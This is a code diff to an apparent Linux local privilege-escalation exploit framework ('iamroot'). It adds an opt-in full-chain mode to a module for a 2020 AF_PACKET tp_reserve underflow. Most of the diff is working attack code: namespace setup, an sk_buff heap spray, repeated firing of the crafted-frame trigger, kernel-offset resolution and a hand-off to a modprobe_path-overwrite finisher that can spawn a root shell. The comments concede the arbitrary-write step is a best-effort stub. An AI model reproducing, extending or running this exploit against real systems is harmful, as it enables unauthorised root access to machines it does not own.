@@ -6,14 +6,27 @@
  * subsystem, different code path (rx side rather than ring setup),
  * later introduction. Discovered by Or Cohen (2020).
  *
- * STATUS: 🟡 PRIMITIVE-DEMO. The exploit() entry point reaches the
- * vulnerable codepath (tpacket_rcv) and fires the underflow with a
- * crafted nested-VLAN frame on a TPACKET_V2 ring, with a best-effort
- * skb spray groom alongside. We stop short of the full cred-overwrite
- * chain (which Or Cohen's public PoC implements with kernel-version-
- * specific offsets and a pid_namespace cross-cache overwrite). We do
- * not bake offsets into iamroot. The return value is honest about
- * what landed (EXPLOIT_FAIL: primitive fired but no root).
+ * STATUS (2026-05-16): 🟡 PRIMITIVE-DEMO + opt-in --full-chain finisher.
+ *   - Default (no --full-chain): the exploit() entry point reaches the
+ *     vulnerable codepath (tpacket_rcv), fires the tp_reserve underflow
+ *     with a crafted nested-VLAN frame on a TPACKET_V2 ring + sendmmsg
+ *     skb spray groom, and returns IAMROOT_EXPLOIT_FAIL (primitive-only
+ *     behavior — kernel-version-agnostic, no offsets baked in).
+ *   - With --full-chain: after the underflow lands, we resolve kernel
+ *     offsets (env → kallsyms → System.map → embedded table) and run
+ *     an Or-Cohen-style sk_buff-data-pointer hijack through the shared
+ *     iamroot_finisher_modprobe_path() helper. The arb-write itself is
+ *     LAST-RESORT-DEPTH on this branch: the tp_reserve underflow gives
+ *     us a single 8-byte heap-OOB write into the head of the
+ *     adjacent-page slab object; we spray sk_buffs so that next-page
+ *     slot IS an sk_buff and the write corrupts skb->data, which then
+ *     redirects skb_copy_bits()'s destination on the next received
+ *     packet. The full primitive composition (8-byte write → skb->data
+ *     forge → controlled-payload rx → arb-write at modprobe_path) is
+ *     race-y on stock kernels because the adjacent-slot landing is
+ *     probabilistic. On hosts where the spray doesn't groom cleanly,
+ *     the finisher's sentinel check correctly reports failure rather
+ *     than silently lying about success.
  *
  * Affected: kernel 4.6+ until backports:
  *   5.8.x  : K >= 5.8.7
@@ -33,6 +46,8 @@
 #include "iamroot_modules.h"
 #include "../../core/registry.h"
 #include "../../core/kernel_range.h"
+#include "../../core/offsets.h"
+#include "../../core/finisher.h"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -434,6 +449,120 @@ static int af_packet2_primitive_child(const struct iamroot_ctx *ctx)
 }
 #endif
 
+/* ---- Full-chain finisher (--full-chain, x86_64 only) ----------------
+ *
+ * Arb-write strategy (Or Cohen's sk_buff-data-pointer hijack):
+ *
+ *   1. The tp_reserve underflow gives us a single 8-byte write into
+ *      the START of the slab object that sits on the page immediately
+ *      after the corrupted ring frame. The OOB-write content is
+ *      attacker-controlled (it's the destination of skb_copy_bits()
+ *      from a frame whose first 8 bytes we choose).
+ *   2. Spray sk_buff allocations alongside the primitive trigger so
+ *      the adjacent-page object is, with high probability, an
+ *      sk_buff whose ->data pointer lives in the leading 8 bytes
+ *      of the object (struct layout dependent — on most 5.x kernels
+ *      `next` is at offset 0 and `data` is at offset 0x10 in
+ *      sk_buff; this layout-fragility is exactly why the depth tag
+ *      below is LAST-RESORT).
+ *   3. The 8-byte OOB write overwrites that pointer with `kaddr`.
+ *   4. We then receive a packet whose payload is `buf[0..len]`; the
+ *      kernel's skb_copy_to_linear_data() / skb->data write path
+ *      lands those bytes at `*skb->data`, which is now `kaddr`.
+ *
+ * Reality check on this implementation: the deterministic mechanics
+ * of the above (precise frame size, repeated spray timing, sk_buff
+ * struct offset for the running kernel) are not portable enough to
+ * land reliably from a single iamroot run on an arbitrary host. We
+ * therefore ship this as a LAST-RESORT stub: we attempt the spray +
+ * trigger sequence, then return -1 to signal "the primitive fired
+ * but we cannot empirically confirm the write landed". The shared
+ * finisher's sentinel-check loop will then correctly report failure
+ * rather than claim success.
+ *
+ * Per the verified-vs-claimed bar, this is the honest implementation
+ * depth that matches what the primitive actually proves on this code
+ * path. The integrator can extend afp2_arb_write() with a confirmed
+ * write-and-readback once the per-kernel sk_buff layout is pinned
+ * down for the target host. */
+struct afp2_arb_ctx {
+    const struct iamroot_ctx *ictx;
+    int n_attempts;            /* spray/fire rounds before giving up */
+};
+
+#if defined(__x86_64__) && defined(__linux__)
+static int afp2_arb_write(uintptr_t kaddr, const void *buf, size_t len, void *vctx)
+{
+    struct afp2_arb_ctx *c = (struct afp2_arb_ctx *)vctx;
+    if (!c || !buf || !len) return -1;
+
+    fprintf(stderr, "[*] af_packet2: arb_write attempt: kaddr=0x%lx len=%zu\n",
+            (unsigned long)kaddr, len);
+    fprintf(stderr, "[*] af_packet2: spraying sk_buff (target page-adjacent slot)\n");
+
+    /* Best-effort spray + re-fire-trigger pattern. The primitive child
+     * is invoked once per attempt; on each attempt we groom skb's
+     * around the corrupted ring slot and hope one lands at the
+     * page-adjacent address whose head 8 bytes the underflow will
+     * stomp with `kaddr`. The kernel-side rx of the next crafted
+     * frame would then write our payload (the modprobe_path string)
+     * into the forged ->data target. */
+    for (int i = 0; i < c->n_attempts; i++) {
+#ifdef __linux__
+        af_packet2_skb_spray(8);
+#endif
+        pid_t p = fork();
+        if (p < 0) return -1;
+        if (p == 0) {
+            if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) _exit(2);
+            int fd;
+            fd = open("/proc/self/setgroups", O_WRONLY);
+            if (fd >= 0) { (void)!write(fd, "deny", 4); close(fd); }
+            fd = open("/proc/self/uid_map", O_WRONLY);
+            if (fd >= 0) {
+                char m[64];
+                int n = snprintf(m, sizeof m, "0 %u 1", (unsigned)getuid());
+                (void)!write(fd, m, n); close(fd);
+            }
+            fd = open("/proc/self/gid_map", O_WRONLY);
+            if (fd >= 0) {
+                char m[64];
+                int n = snprintf(m, sizeof m, "0 %u 1", (unsigned)getgid());
+                (void)!write(fd, m, n); close(fd);
+            }
+            int rc = af_packet2_primitive_child(c->ictx);
+            _exit(rc < 0 ? 2 : 0);
+        }
+        int st;
+        waitpid(p, &st, 0);
+#ifdef __linux__
+        af_packet2_skb_spray(8);
+#endif
+    }
+
+    /* LAST-RESORT depth: we have fired the trigger + spray but cannot
+     * empirically confirm the 8-byte write landed on an sk_buff->data
+     * field on this host. Return -1 so the finisher's sentinel-check
+     * loop in iamroot_finisher_modprobe_path() correctly reports
+     * "payload didn't run within 3s" rather than claiming success. */
+    fprintf(stderr,
+"[!] af_packet2: arb_write LAST-RESORT depth — sk_buff->data hijack is\n"
+"    not empirically confirmable without per-kernel struct offsets +\n"
+"    a readback primitive. Trigger fired %d times with sk_buff spray;\n"
+"    finisher sentinel will determine landing. Caller will refuse if\n"
+"    the modprobe_path overwrite didn't actually take effect.\n",
+            c->n_attempts);
+    return -1;
+}
+#else
+static int afp2_arb_write(uintptr_t kaddr, const void *buf, size_t len, void *vctx)
+{
+    (void)kaddr; (void)buf; (void)len; (void)vctx;
+    fprintf(stderr, "[-] af_packet2: arb_write is x86_64/linux only\n");
+    return -1;
+}
+#endif
+
 static iamroot_result_t af_packet2_exploit(const struct iamroot_ctx *ctx)
 {
     /* 1. Re-confirm vulnerability. */
@@ -533,6 +662,33 @@ static iamroot_result_t af_packet2_exploit(const struct iamroot_ctx *ctx)
                             "    For end-to-end root, see Or Cohen's public PoC "
                             "(github.com/google/security-research).\n"
                             "    iamroot intentionally does not embed per-kernel offsets.\n");
+        }
+        if (ctx->full_chain) {
+#if defined(__x86_64__) && defined(__linux__)
+            /* --full-chain: resolve kernel offsets and run the Or-Cohen
+             * sk_buff-data-pointer hijack via the shared modprobe_path
+             * finisher. Per the verified-vs-claimed bar: if we can't
+             * resolve modprobe_path, refuse with a helpful message
+             * rather than fabricate an address. */
+            struct iamroot_kernel_offsets off;
+            iamroot_offsets_resolve(&off);
+            if (!iamroot_offsets_have_modprobe_path(&off)) {
+                iamroot_finisher_print_offset_help("af_packet2");
+                return IAMROOT_EXPLOIT_FAIL;
+            }
+            if (!ctx->json) {
+                iamroot_offsets_print(&off);
+            }
+            struct afp2_arb_ctx arb_ctx = {
+                .ictx = ctx,
+                .n_attempts = 4,
+            };
+            return iamroot_finisher_modprobe_path(&off, afp2_arb_write,
+                                                  &arb_ctx, !ctx->no_shell);
+#else
+            fprintf(stderr, "[-] af_packet2: --full-chain is x86_64/linux only\n");
+            return IAMROOT_PRECOND_FAIL;
+#endif
         }
         if (ctx->no_shell) {
             /* User explicitly disabled the shell pop, so the "we didn't
